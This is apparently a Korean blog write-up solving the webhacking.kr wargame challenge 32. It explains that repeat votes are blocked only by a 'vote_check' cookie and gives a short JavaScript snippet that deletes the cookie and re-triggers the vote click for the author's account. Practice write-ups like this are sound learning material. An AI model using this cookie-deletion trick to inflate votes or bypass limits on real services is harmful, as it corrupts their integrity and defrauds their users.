---
layout: post
title: "Webhacking.kr 32번 문제"
description: ""
categories : development
sub_categories : ""
date: 2017-05-11
tags: [webhacking, 'webhacking.kr']
comments: true
share: true
background_image: /assets/images/posts/well-used/hacked.jpg
---

32 번 문제는 150 스코어의 문제입니다.

문제를 보면, 100명의 리스트가 존재합니다.

하단에 입장에 버튼이있는데 해당 버튼을 누르면 100명의 리스트에 제 계정이 추가됩니다.  
  
이후 본인 계정에 클릭을하게되면 vote up 이 됩니다.  
이후 스코어 1점이 추가되는데, 추가 이후에 추천을 누르면 `no` 메세지와 함께 추천이 안됩니다.  
  
요소를 보니 클릭 시, 아래와 같은 이벤트가 발생합니다.  
location.href='?hit='본인 계정'

  
추천과 동시에 `vote_check` 쿠키가 하나 생성됩니다.

보아하니 쿠키로 구분하여 추천 여부를 판별하는 것 같습니다.  
  
일단 저는 아래와 같이 간단하게 스크립트를 하나 작성했습니다.  
코드의 내용은 `vote_check` 라는 쿠키를 지운 후, 추천 요청을 하는 것 입니다.  
  
특성 상, 이벤트가 발생하면 페이지가 새로 로드되기 때문에 저는 사용하고있는 크롬 확장 프로그램을 통하여 해당 스크립트를 기입해 문제를 해결
했습니다.

  

하단에 소스 코드를 기재했습니다.

코드 상 셀렉트 부분을 참고하시면

onclick^="location.href='+"'?hit=hax0r'"+'" 이라 되어있는데, 여기서 hax0r 을 보인 계정으로
치환하시면 됩니다.

hax0r 은 제 계정이에여.

  

![](/assets/images/posts/743/2463304A591415CB017CFE.JPEG)

  

    var delCookie = function(name) {    document.cookie = name + '=;expires=Thu, 01 Jan 1970 00:00:01 GMT;';};/* Node Select 를 위해 Jquery 비동기 로드 */(function () {    function loadScript(url, callback) {        var script = document.createElement("script")        script.type = "text/javascript";        if (script.readyState) { //IE            script.onreadystatechange = function () {                if (script.readyState == "loaded" || script.readyState == "complete") {                    script.onreadystatechange = null;                    callback();                }            };        } else { //Others            script.onload = function () {                callback();            };        }        script.src = url;        document.getElementsByTagName("head")[0].appendChild(script);    }    loadScript("https://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js", function () {             console.log('jquery loaded');            /* 계정 vote */var voteUpMe = function(e) {  delCookie('vote_check');  $('tr[onclick^="location.href='+"'?hit=hax0r'"+'"]').trigger('click');}     });})();

  

